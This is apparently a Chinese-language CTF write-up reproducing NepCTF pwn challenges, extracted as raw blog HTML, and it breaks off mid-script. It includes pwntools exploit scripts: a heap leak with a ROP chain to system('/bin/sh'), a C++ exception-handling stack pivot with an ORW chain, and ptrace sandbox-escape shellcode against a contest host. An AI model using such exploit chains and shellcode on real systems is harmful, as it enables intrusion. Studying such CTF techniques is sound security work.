class=\"string\">&quot;to user_logs\\n&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tio.send(content)</span><br><span class=\"line\">\t    </span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io,&quot;b *$rebase(0x179F)&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># leak pie &amp; heap</span></span><br><span class=\"line\">user(<span class=\"string\">&quot;MANAGER_visit&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">manager_user_read()</span><br><span class=\"line\">io.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">heap_addr=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))<span class=\"comment\">#-0x1f30</span></span><br><span class=\"line\">io.recv(<span class=\"number\">2</span>)</span><br><span class=\"line\">pie=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x41a0</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;heap_addr&quot;</span>,<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;pie&quot;</span>,<span class=\"built_in\">hex</span>(pie))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># heap1-&gt; next = manage_physic[2]</span></span><br><span class=\"line\">manager_user_write(p64(<span class=\"number\">1</span>)+p64(heap_addr)+p64(heap_addr-<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">manager_write(p64(pie+elf.got[<span class=\"string\">&quot;puts&quot;</span>]))</span><br><span class=\"line\">manager_user_read()</span><br><span class=\"line\">puts=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">libc_base=puts-libc.sym[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">system=libc_base+libc.sym[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\">bin_sh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>))</span><br><span class=\"line\">pop_rdi=libc_base+pop_rdi</span><br><span class=\"line\">ret=libc_base+ret</span><br><span class=\"line\"><span class=\"comment\"># leak stack</span></span><br><span class=\"line\">manager_write(p64(libc_base+libc.sym[<span class=\"string\">&quot;environ&quot;</span>]))</span><br><span class=\"line\">manager_user_read()</span><br><span class=\"line\">stack=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x150</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># heap1-&gt;next=stack</span></span><br><span class=\"line\">manager_write(p64(stack))</span><br><span class=\"line\">payload=p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)</span><br><span class=\"line\">manager_user_write(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#user(&quot;USER_write&quot;,0)</span></span><br><span class=\"line\"><span class=\"comment\">#io.sendlineafter(&quot;user_logs\\n&quot;,str(1))</span></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"canutrytry\"><a href=\"#canutrytry\" class=\"headerlink\" title=\"canutrytry\"></a>canutrytry</h2><h3 id=\"查看沙箱-1\"><a href=\"#查看沙箱-1\" class=\"headerlink\" title=\"查看沙箱\"></a>查看沙箱</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805082927143.png\" alt=\"image-20250805082927143\"></p>\n<p>只允许read，write，close，futex的syscall。看来是要ORW了。</p>\n<h3 id=\"ida-分析-1\"><a href=\"#ida-分析-1\" class=\"headerlink\" title=\"ida 分析\"></a>ida 分析</h3><p>打开一看发现这是一道c++的题目。先从main函数开始分析函数的主要逻辑。</p>\n<h4 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main\"></a>main</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805210913492.png\" alt=\"main函数\"></p>\n<p>先看汇编，发现有很多try，catch，这是c++的异常处理。反汇编后这些部分没有显示出来，我们先不看，先分析主要功能。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213430837.png\" alt=\"main函数\"></p>\n<p>两个主要功能，visit()和left()</p>\n<h5 id=\"visit\"><a href=\"#visit\" class=\"headerlink\" title=\"visit\"></a>visit</h5><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213930699.png\" alt=\"visit函数\"><br><img src=\"C:/Users/22354/AppData/Roaming/Typora/typora-user-images/image-20250805214633791.png\" alt=\"visit函数\"></p>\n<p>visit中有三个选项，2只能按顺序设置堆块大小且只有2次，1 只能按顺序malloc两次堆块，3 可以任意写堆块的内容。且idx无检测。</p>\n<p>1 选项中有对异常的处理。</p>\n<h5 id=\"left\"><a href=\"#left\" class=\"headerlink\" title=\"left\"></a>left</h5><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805221246184.png\" alt=\"left函数\"></p>\n<p>只有一次机会，可以把堆块的内容复制到栈上，大小无限制。且有对异常的处理。</p>\n<p>毫无疑问，此题中异常处理是至关重要的。所以我们接下来要分析所以try ，catch的对应关系。</p>\n<h3 id=\"异常处理对应\"><a href=\"#异常处理对应\" class=\"headerlink\" title=\"异常处理对应\"></a>异常处理对应</h3><h5 id=\"分析方法\"><a href=\"#分析方法\" class=\"headerlink\" title=\"分析方法\"></a>分析方法</h5><p>ida在汇编代码中，会对catch标记，在其后面标注owner by xxx</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222122309.png\" alt=\"catch\"> </p>\n<p>根据这样的对应关系，我们可以把main函数重新反汇编一下，把完整的函数逆向出来。</p>\n<p>当然ida 有视图可以更好的看出函数的跳转对应关系</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222435058.png\" alt=\"跳转\"></p>\n<h5 id=\"分析结果\"><a href=\"#分析结果\" class=\"headerlink\" title=\"分析结果\"></a>分析结果</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    seccomp_add();</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">            try&#123;</span><br><span class=\"line\">                menu();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            catch&#123;</span><br><span class=\"line\">                sub_4016ec();</span><br><span class=\"line\">                sub_401652();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            try&#123;</span><br><span class=\"line\">                <span class=\"built_in\">stdin</span>&gt;&gt;choice;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(choice!=<span class=\"number\">1</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                visit_nep();</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(choice!=<span class=\"number\">2</span>) <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">                left_nep();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            catch&#123;</span><br><span class=\"line\">                <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;you catch the error &quot;</span> &lt;&lt; err2 &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">                <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;here is a gift for you!&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;setbufaddr:%p\\n&quot;</span>, setbuf_ptr);</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;stackaddr:%p\\n&quot;</span>, &amp;choice);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"思路分析-1\"><a href=\"#思路分析-1\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h4><ol>\n<li>首先要通过visit或left中的异常处理，泄露出stack和 libc的信息。要注意的是，为了后续利用，这一步显然是通过visit 的异常，也就是size值非法。再注意，因为只能按顺序来，所以第一个堆块不能非法。所以要先申请第一个堆块后，利用第二个堆块的大小非法，触发异常拿到stack 和 libc </li>\n<li>紧接着，要利用left中的异常，也就是复制的内容长度超过16.这里需要让异常处理跳转到menu（）的异常处理。只要把left的返回地址，修改为menu 函数执行完成时的返回地址就行。</li>\n<li>第二步完成后，程序跳转到0x4610ec。这里会往bss 段上read ，显然是用来输入ROP的。</li>\n<li>第三步过后，通过0x401652函数，程序最后跳转到0x4015d4。又有一次read，可以覆盖到rbp，同样会触发异常。但是最后还是会leave_ret,可以栈迁移。只要把rbp覆盖为之前输入ROP的地址-8 ，就行。</li>\n</ol>\n<h3 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./canutrytry&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">visit</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;your choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;your choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">visit_op</span>(<span class=\"params\">op,size,idx</span>): <span class=\"comment\"># size(content),1</span></span><br><span class=\"line\">\tvisit()</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;your choice &gt;&gt;&quot;</span>,<span class=\"built_in\">str</span>(op))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> op == <span class=\"number\">2</span> :</span><br><span class=\"line\">\t\tio.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> op == <span class=\"number\">3</span> :</span><br><span class=\"line\">\t\tio.sendlineafter(<span class=\"string\">&quot;index&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\t\tio.sendafter(<span class=\"string\">&quot;content&quot;</span>,size)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave_op</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tleave()</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401600&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#1 leak libc &amp; stack</span></span><br><span class=\"line\">visit_op(<span class=\"number\">2</span>,<span class=\"number\">0x40</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">visit_op(<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">visit_op(<span class=\"number\">2</span>,-<span class=\"number\">1</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">visit_op(<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;setbufaddr:&quot;</span>)</span><br><span class=\"line\">libc_base=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x88060</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;stackaddr:&quot;</span>)</span><br><span class=\"line\">stack=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;stack&quot;</span>,<span class=\"built_in\">hex</span>(stack))</span><br><span class=\"line\"></span><br><span class=\"line\">write=libc_base+libc.sym[<span class=\"string\">&quot;write&quot;</span>]</span><br><span class=\"line\"><span class=\"comment\">## gadgets</span></span><br><span class=\"line\">pop_rdi=libc_base + <span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">pop_rsi=libc_base + <span class=\"number\">0x2be51</span></span><br><span class=\"line\">pop_rdx=libc_base + <span class=\"number\">0x11f497</span>  <span class=\"comment\"># pop rdx;pop r12;ret</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x401650</span></span><br><span class=\"line\"><span class=\"comment\">## addr </span></span><br><span class=\"line\">ROP=<span class=\"number\">0x4016EC</span></span><br><span class=\"line\">flag=<span class=\"number\">0x4053C0</span></span><br><span class=\"line\">buf=<span class=\"number\">0x405460</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2 prepare my ROP </span></span><br><span class=\"line\">payload=<span class=\"number\">0x20</span>*<span class=\"string\">b&quot;a&quot;</span>+p64(buf)+p64(<span class=\"number\">0x401ed9</span>)</span><br><span class=\"line\">visit_op(<span class=\"number\">3</span>,payload,<span class=\"number\">0</span>)</span><br><span class=\"line\">leave_op(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#3 orw  flag</span></span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>)+p64(pop_rdi)+p64(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload+= p64(pop_rsi)+p64(flag)</span><br><span class=\"line\">payload+= p64(pop_rdx)+p64(<span class=\"number\">0x64</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+= p64(write)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;well,prepare your rop now!&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#4</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x10</span></span><br><span class=\"line\">payload+= p64(buf) </span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;Enter your flag: &quot;</span>,<span class=\"string\">b&quot;hhhh&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#5</span></span><br><span class=\"line\">io.send(payload) </span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","excerpt":"","more":"<h1 id=\"Nepctf–pwn复现\"><a href=\"#Nepctf–pwn复现\" class=\"headerlink\" title=\"Nepctf–pwn复现\"></a>Nepctf–pwn复现</h1><h2 id=\"time\"><a href=\"#time\" class=\"headerlink\" title=\"time\"></a>time</h2><h2 id=\"smallbox\"><a href=\"#smallbox\" class=\"headerlink\" title=\"smallbox\"></a>smallbox</h2><h3 id=\"查看沙箱\"><a href=\"#查看沙箱\" class=\"headerlink\" title=\"查看沙箱\"></a>查看沙箱</h3><p>题目名字和描述都很明显，拖下来首先就是看一下沙箱。发现只允许一个syscall，ptrace。之前也没遇到过这类题目，先去了解了一下。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093312153.png\" alt=\"image-20250728093312153\"></p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p>先用mmap分配了一块空间，并给了可读可写可执行的权限。然后fork，然后read，然后上沙箱。最后会调用shellcode。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093914695.png\" alt=\"image-20250728093914695\"></p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>1.沙箱禁用了其他函数，只能使用ptrace 操作。可以获取子进程pid，所以可以操作子进程。 因为沙箱再后面install ，但是子进程出来一直在循环，所以还没装沙箱。</p>\n<p>2.利用ptrace修改子进程rip，使其跳过沙箱。同时通过ptrace 往子进程的空间中写入shellcode ，最后让子进程跳转到这，因为没有沙箱，所以子进程就可以getshell。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><p>当时写的时候，没有通过ptrace,去往里写，以为父进程中读入的shellcode，子进程也有。反复尝试了很久，都失败了。还以为是attach 失败，又或者是改rip错了。后面意识到，一个点，父进程中输入的shellcdoe ，子进程不应该有才对，才反应过了同过ptrace往里写。也是学到了。</p>\n<p>之前看到fork 只能联想到爆破cananry，现在知道可以通过ptrace控制子进程了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#io,elf=loadfile(&quot;./smallbox&quot;,&quot;&quot;,0)</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;66%&#x27;]</span></span><br><span class=\"line\">host=<span class=\"string\">&quot;nepctf31-oted-rgpe-shrp-juf9qwjd6957.nepctf.com&quot;</span></span><br><span class=\"line\">port=<span class=\"number\">443</span></span><br><span class=\"line\">io= remote(host, port, ssl=<span class=\"literal\">True</span>, sni=host)</span><br><span class=\"line\">execve_shellcode=(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x3b\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,0x3b</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xBF\\x19\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rdi,0xdeadc0de019</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xf6&#x27;</span>   <span class=\"comment\"># xor rsi,rsi</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode=(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x8B\\x7D\\xF4&#x27;</span> <span class=\"comment\"># mov r15d,[rbp-0xc]</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x10\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,10h</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4D\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor r10,r10</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x0c\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,ch</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xBA\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r10,0x0deadc0de500</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\">)</span><br><span class=\"line\">shellcode+=(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xB8\\x00\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r8,0x0deadc0de000</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xB9\\x00\\xE2\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r8,0x0deadc0de200</span></span><br><span class=\"line\">)</span><br><span class=\"line\">shellcode+=<span class=\"number\">4</span>*(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x05\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,10h</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4C\\x89\\xC2&#x27;</span> <span class=\"comment\"># mov rdx, r8</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4D\\x8B\\x11&#x27;</span><span class=\"comment\">#mov  r10, [r9]</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\x83\\xC0\\x08&#x27;</span> <span class=\"comment\"># add r8+8</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\x83\\xC1\\x08&#x27;</span> <span class=\"comment\"># add r8+8</span></span><br><span class=\"line\">)</span><br><span class=\"line\">shellcode+=(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xB9\\x00\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span> <span class=\"comment\">#  mov r9,0x0deadc0de200</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xB8\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r8,0x0deadc0de500</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4D\\x89\\x88\\x80\\x00\\x00\\x00&#x27;</span>             <span class=\"comment\">#  mov    [r8+0x80],r9</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span 